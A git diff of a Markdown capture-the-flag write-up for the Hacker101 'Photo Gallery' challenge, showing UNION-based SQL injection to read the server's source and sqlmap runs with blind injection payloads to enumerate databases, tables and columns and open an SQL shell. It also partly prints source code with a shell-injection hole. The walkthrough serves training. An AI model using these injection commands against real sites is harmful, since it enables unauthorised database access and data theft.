@@ -8,7 +8,7 @@ Ok, they are adorable, but where is the 3rd one?
 
 --- 
 
-## Flag 0 - Sneaky SQL injection
+## Flag 0 - Injecting some SQL to find the missing kitten
 
 ### Accessing the situation - part 1:
 
@@ -232,7 +232,7 @@ What now...? Oh, I forgot the `'`
 ```
 https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=-1 UNION SELECT 'main.py'
 ```
-Finally, we get the source code...
+Finally, we get the [source code](./helpfull_files/main.py)...
 
 ```html
 from flask import Flask, abort, redirect, request, Response
@@ -240,57 +240,7 @@ import base64, json, MySQLdb, os, re, subprocess
 
 app = Flask(__name__)
 
-home = '''
-<!doctype html>
-<html>
-	<head>
-		<title>Magical Image Gallery</title>
-	</head>
-	<body>
-		<h1>Magical Image Gallery</h1>
-$ALBUMS$
-	</body>
-</html>
-'''
-
-viewAlbum = '''
-<!doctype html>
-<html>
-	<head>
-		<title>$TITLE$ -- Magical Image Gallery</title>
-	</head>
-	<body>
-		<h1>$TITLE$</h1>
-$GALLERY$
-	</body>
-</html>
-'''
-
-def getDb():
-	return MySQLdb.connect(host="localhost", user="root", password="", db="level5")
-
-def sanitize(data):
-	return data.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
-
-@app.route('/')
-def index():
-	cur = getDb().cursor()
-	cur.execute('SELECT id, title FROM albums')
-	albums = list(cur.fetchall())
-
-	rep = ''
-	for id, title in albums:
-		rep += '<h2>%s</h2>\n' % sanitize(title)
-		rep += '<div>'
-		cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
-		fns = []
-		for pid, ptitle, pfn in cur.fetchall():
-			rep += '<div><img src="fetch?id=%i" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
-			fns.append(pfn)
-		rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
-		rep += '</div>\n'
-
-	return home.replace('$ALBUMS$', rep)
+[...]
 
 @app.route('/fetch')
 def fetch():
@@ -312,10 +262,219 @@ if __name__ == "__main__":
 
 ### Notes:
 * I don't know how would anyone guess that this is a python server without the hint. All the write ups for this just assume there is a `main.py` file. I guess this is a common thing to look for.
+* An interesting read about the UNION-based Injection is [this](https://sqlwiki.netspi.com/injectionTypes/unionBased/#mysql) from sqlwiki.netspi.com
+
+---
+
+## Flag 1 - Following the missing kitten back to its home
+
+### Useful Info:
+
+[sqlmap cheatsheet with examples](https://resources.infosecinstitute.com/topic/important-sqlmap-commands/)
 
 
+### Accessing the situation:
 
-## Flag 1 - Never trust an invisible kitten
+I am not in the mood to stumble around in the dark anymore. Give me the hints:
 
+```
+* I never trust a kitten I can't see
+* Or a query whose results I can't see, for that matter
+```
 
-...
+Ok, these are more or less useless on their own. Let's take a closer look at the source code...
+
+Some conclusions can be drawn from looking at the code about:
+
+* The database:
+    * It is a MySQL database
+    * host: same as server ip
+    * username is `root` with no password
+    * the database name is `level5`
+        * It has two tables (maybe more):
+            * `albums` with columns `id`, `title`
+            * `photos` with columns `id`, `title`, `filename`, `parent`
+* The landing page:
+    * The `Space used:` message shows the last line from the results of this bash command: `du -ch files/__file1__ files/__file2__ || exit 0`
+* The `/fetch` endpoint:
+    * It expects an `id` from the request's headers. Does not check what this `id` may be.
+    * If the query affects no rows then it uses the result of the first line to read a file and render its contents. Otherwise it 404s.
+
+The `/fetch` endpoint is the one we will focus on. We can pass any SQL command to it (as long as it affects no rows, so only reading) and it has two possible responses (`404` and `500`).
+
+Let's try to use a readily available tool for this challenge. [SQLmap](https://sqlmap.org/) is the one for the job. Let's use the most common command:
+
+```
+sqlmap -u "https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=1" --batch
+```
+
+After a little while the results are in:
+
+```log
+[...]
+
+sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2374=2374
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: id=1 OR SLEEP(5)
+---
+[17:15:21] [INFO] the back-end DBMS is MySQL
+web application technology: OpenResty 1.19.9.1
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[17:15:23] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 10 times, 500 (Internal Server Error) - 278 times
+```
+
+The complete log is in the [sqlmap.log](./helpfull_files/sqlmap.log) file.
+
+It has given us a lot of useful information! Let's use this tool in a more aggressive way by using the `-dbs` flag. Also, let's add some speed with `--threads 8`.
+
+sqlmap will use the exploits it have found to retrieve the databases' names. It achieves this by treating the server as an oracle. The server responds with `500` or `404` depending on whether the sql commands were run successfully or not. This way we can find a lot of info.
+
+For example, let's find what databases exist by running: 
+
+```
+sqlmap -u "https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=1" --dbs --threads 8
+```
+
+```log
+[...]
+
+available databases [4]:
+[*] information_schema
+[*] level5
+[*] mysql
+[*] performance_schema
+```
+
+Ok, we knew there exists a `level5` database by looking at the source code. The other 3 are typical MySQL databases and are not useful to us right now.
+
+Let's find what tables exist in the `level5` database by running:
+
+```
+sqlmap -u "https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=1" --threads 8 -D level5 --tables
+```
+
+```log
+[...]
+
+Database: level5
+[2 tables]
++--------+
+| albums |
+| photos |
++--------+
+```
+
+Again, this is confirmed by the source code. Can we extract anything more? Let's see the columns of the table `photos`:
+
+```
+sqlmap -u "https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=1" --threads 8 -D level5 -T photos --columns
+```
+
+```log
+[...]
+
+Database: level5
+Table: photos
+[4 columns]
++----------+---------+
+| Column   | Type    |
++----------+---------+
+| filename | text    |
+| id       | int(11) |
+| parent   | int(11) |
+| title    | text    |
++----------+---------+
+```
+
+Ok, so the source code literally told us everything about this table. Can we have a more direct access to the database though? What about a mysql shell?
+
+```
+sqlmap -u "https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=1" --threads 8 --sql-shell
+```
+
+After disabling the threads when sqlmap asks:
+
+```log
+[...]
+
+[18:15:43] [INFO] resuming back-end DBMS 'mysql' 
+[18:15:43] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2374=2374
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: id=1 OR SLEEP(5)
+---
+[18:15:45] [INFO] the back-end DBMS is MySQL
+web application technology: OpenResty 1.19.9.1
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[18:15:45] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
+sql-shell>
+```
+
+Ok, let's try to type something...
+
+Typing `?` Doesn't work, I don't know why I typed that...
+
+Let's try to see the contents of the `photos` table. Let's type `USE level5` as we would in an sql shell. No answer back which is good.
+
+Now let's send `SELECT * FROM photos` about which sqlmap says:
+
+```log
+[18:19:42] [INFO] fetching SQL SELECT statement query output: 'SELECT * FROM photos'
+[18:19:42] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
+[18:19:42] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
+```
+
+Ok, I though I had an interactive shell running. That is not the case. Sqlmap tries to create the *illusion* of an SQL shell I guess. Each SQL command is run by making a request to the server, it doesn't ssh into it. After some time we see:
+
+```log
+[...]
+
+the SQL query provided can return 3 entries. How many entries do you want to retrieve?
+[a] All (default)
+[#] Specific number
+[q] Quit
+> a
+
+[...]
+
+[18:20:09] [INFO] the query with expanded column name(s) is: SELECT filename, id, parent, title FROM photos
+
+[...]
+
+[*] files/adorable.jpg, 1, 1, Utterly adorable
+[*] files/purrfect.jpg, 2, 1, Purrfect
+[*] d107946d4c338bd606e3074815ed6545f31b2b97b46b7cb44e20f37580512c0b, 3, 1, Invisible
+```
+
+Ok, before examining the results, let's exit the *sql shell*.
+
+The final value for the `filename` is strange. It must be some encoded string or something similar.
+
+*Some googling later*
+
+Ok, that was a strange series of events... I initially thought this was a base64 string, which is not the case. Then I noticed that the letters only go up to `f` and the string has an even number of characters. This means that this might be a series of HEX values. Is it an ascii string? Wait a minute! The flag is a series of hex values. "Is the flag looking right at me?" is what I thought. This is indeed the case. That is the flag.
+
+### Notes:
+* A very nicely written writeup for this challenge is [this one](https://dev.to/caffiendkitten/hacker101-ctf-photo-gallery-4foi) from *DaNel C*. I got the motivation to use `sqlmap` instead of writing my own tool from scratch. I don't know how she decoded the flag though. It might be an old version of the challenge? The write up was initially written on `Apr 25, 2020` and updated on `Dec 19, 2020`. I don't know...
+* Another write up is the [one](https://www.secjuice.com/photo-gallery/) from *pirateducky*. He solves the second flag by writing his own ruby script.
+* The actual flag has been replaced by random HEX values.
+
+---
+
+## Flag 2 -
+
